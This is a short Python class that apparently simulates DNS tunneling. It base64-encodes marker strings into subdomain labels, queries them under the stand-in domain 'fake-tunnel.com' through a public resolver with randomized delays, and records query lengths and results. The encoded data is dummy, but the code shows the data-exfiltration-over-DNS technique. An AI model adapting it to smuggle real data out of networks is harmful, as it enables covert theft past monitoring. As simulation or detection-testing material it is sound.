import dns.resolver
import base64
import random
import time
from datetime import datetime

class DNSTunnel:
    def __init__(self, count=30):
        self.count = count

    def run(self, targets: list) -> dict:
        r = {'start_time': datetime.now().isoformat(), 'targets': {}}
        for ip in targets:
            queries = []
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8']
            for i in range(self.count):
                fd = base64.b64encode(f"bot_{ip}_{i}".encode()).decode().replace('=','')[:40]
                sub = '.'.join([fd[j:j+8] for j in range(0,len(fd),8)])
                domain = f"{sub}.fake-tunnel.com"
                try:
                    resolver.resolve(domain, 'A')
                    queries.append({'len':len(domain),'res':'RESOLVED'})
                except dns.resolver.NXDOMAIN:
                    queries.append({'len':len(domain),'res':'NXDOMAIN'})
                except Exception as e:
                    queries.append({'len':len(domain),'error':str(e)[:30]})
                time.sleep(random.uniform(0.1,0.3))
            r['targets'][ip] = {
                'total':len(queries),
                'avg_len':sum(q['len'] for q in queries)/len(queries),
                'sample':queries[:3]
            }
        r['end_time'] = datetime.now().isoformat()
        return r
